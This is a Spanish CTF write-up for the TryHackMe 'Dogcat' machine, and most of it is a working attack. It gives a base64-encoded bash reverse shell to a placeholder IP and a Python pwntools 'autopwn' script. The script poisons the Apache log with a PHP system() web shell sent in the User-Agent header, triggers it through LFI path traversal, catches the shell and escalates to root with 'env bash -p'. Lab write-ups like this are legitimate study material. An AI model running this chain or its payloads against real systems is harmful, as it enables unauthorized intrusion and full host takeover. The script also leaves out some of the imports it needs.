---
layout: single
title: Dogcat (AutoPWN) - Try Hack Me
excerpt: "En esta máquina se abusa de un local file inclusion para efectuar un log poisoning logrando RCE luego de modificar el user agent inyectando instrucciones maliciosas, pero en este post te muestro un pequeño script autopwm hecho en python, el cual nos automatiza la intrusión y escalada de privilegios para convertirnos en root"
date: 2021-08-29
classes: wide
header:
  teaser: /assets/images/thm-autopwm-dogcat/Dogcat.png
  teaser_home_page: true
  icon: /assets/images/tryhackme.png
categories:
  - tryhackme
  - autopwn
  - scripting
tags:
  - python scripting
  - autopwn
  - web
  - lfi
  - log poisoning
  - user agent
---

<p align="center">
<img src="/assets/images/thm-autopwm-dogcat/img_header.png">
</p>

Esta es una máquina de dificultad media bastante sencilla, así que quise hacer un script autopwn que automatizara tanto la intrusión como la escalada de privilegios.<br>
Dejaré el proceso escrito y en video para que todo se entienda.

<p align="center">
<video controls style="width: 80%; height: 100%; margin-right: 10px; margin-bottom: 10px;">
  <source src="/videos/Dogcat-autoPWN.mp4" type="video/mp4">
</video>
</p>

Antes de usarlo se debe de ejecutar el siguite comando, para luego introducir el otput en el script:

```bash
~$> echo "/bin/bash -c 'bash -i >& /dev/tcp/[TU_IP]/443 0>&1'" | base64
L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjkuMjQyLjIxNy80NDMgMD4mMScK
```

Se modifica el payload y la url:

```python
#!/usr/bin/python3

import signal, time
from pwn import *

def def_handler(sig, frame):
	print("\n[!] Exiting...\n")
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

lport = 443
payload = 'echo "[CADENA_EN_BASE64]" | base64 -d | bash' # <- CHANGE THIS
url = 'http://[MACHINE_IP]/?view=./dog/../../../../../../../var/log/apache2/access.log&ext=&cmd=%s' % (payload)

def makeRequest():
	headers = {
	    'User-Agent': '<?php system($_GET[\'cmd\']); ?>'
	}

	r = requests.get(url, headers=headers)

if __name__ == '__main__':
	try:
		log.info("Gaining shell as www-data user")
		time.sleep(1)
		threading.Thread(target=makeRequest).start()
	except Exception as e:
		log.failure(str(e))

	shell = listen(lport, timeout=20).wait_for_connection()

	if shell.sock is None:
		log.failure("Cudn't connect")
	else:
		log.info("Obteining root")
		time.sleep(1)
		shell.sendline("export TERM=xterm; export SHELL=bash; /usr/bin/env /bin/bash -p")
		shell.interactive()

```

Y una vez ejecutado el script obtenemos shell como root:

```bash
~$>./Dogcat-AutoPWN.py
```
```bash
[*] Gaining shell as www-data user
[+] Trying to bind to :: on port 443: Done
[+] Waiting for connections on :::443: Got connection from ::ffff:10.10.52.7 on port 35786
[*] Obteining root
[*] Switching to interactive mode
$
```
```bash
$ whoami
root
```
